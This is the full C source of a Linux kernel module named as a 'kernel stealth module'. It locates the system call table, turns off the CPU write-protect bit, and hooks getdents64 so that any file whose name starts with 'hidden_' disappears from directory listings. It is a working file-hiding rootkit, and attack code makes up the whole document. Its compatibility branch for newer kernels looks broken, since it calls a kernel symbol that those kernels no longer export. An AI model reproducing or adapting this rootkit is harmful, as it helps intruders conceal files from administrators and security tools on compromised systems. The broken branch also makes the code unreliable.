#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <asm/uaccess.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("system");
MODULE_DESCRIPTION("kernel stealth module");

#define PREFIX "hidden_"
#define PREFIX_LEN 7

static unsigned long *sys_call_table;
static asmlinkage long (*original_getdents64)(const struct pt_regs *);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long kallsyms_lookup_name_wrapper(const char *name) {
    return kallsyms_lookup_name(name);
}
#endif

static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

static int is_hidden_file(const char *name) {
    if (!name) return 0;
    return (strncmp(name, PREFIX, PREFIX_LEN) == 0);
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
    unsigned int count = regs->dx;

    long ret = original_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 *buf = kmalloc(ret, GFP_KERNEL);
    if (!buf) return ret;

    if (copy_from_user(buf, dirp, ret)) {
        kfree(buf);
        return ret;
    }

    int hidden = 0;
    struct linux_dirent64 *cur = buf;
    char *end = (char *)buf + ret;
    while ((char *)cur < end) {
        if (is_hidden_file(cur->d_name)) {
            hidden = 1;
            break;
        }
        cur = (struct linux_dirent64 *)((char *)cur + cur->d_reclen);
    }

    if (hidden) {
        struct linux_dirent64 *src = buf;
        struct linux_dirent64 *dst = buf;
        char *src_end = (char *)buf + ret;
        while ((char *)src < src_end) {
            if (!is_hidden_file(src->d_name)) {
                memcpy(dst, src, src->d_reclen);
                dst = (struct linux_dirent64 *)((char *)dst + src->d_reclen);
            }
            src = (struct linux_dirent64 *)((char *)src + src->d_reclen);
        }
        ret = (char *)dst - (char *)buf;
    }

    if (copy_to_user(dirp, buf, ret)) {
        kfree(buf);
        return -EFAULT;
    }

    kfree(buf);
    return ret;
}

static int __init stealth_init(void) {
    printk(KERN_INFO "[stealth] loading module...\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    sys_call_table = (unsigned long *)kallsyms_lookup_name_wrapper("sys_call_table");
#else
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
#endif
    if (!sys_call_table) {
        printk(KERN_ERR "[stealth] failed to locate sys_call_table\n");
        return -1;
    }

    original_getdents64 = (void *)sys_call_table[__NR_getdents64];

    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    enable_write_protection();

    printk(KERN_INFO "[stealth] getdents64 hooked\n");
    return 0;
}

static void __exit stealth_exit(void) {
    if (sys_call_table && original_getdents64) {
        disable_write_protection();
        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        enable_write_protection();
        printk(KERN_INFO "[stealth] getdents64 restored\n");
    }
    printk(KERN_INFO "[stealth] module unloaded\n");
}

module_init(stealth_init);
module_exit(stealth_exit);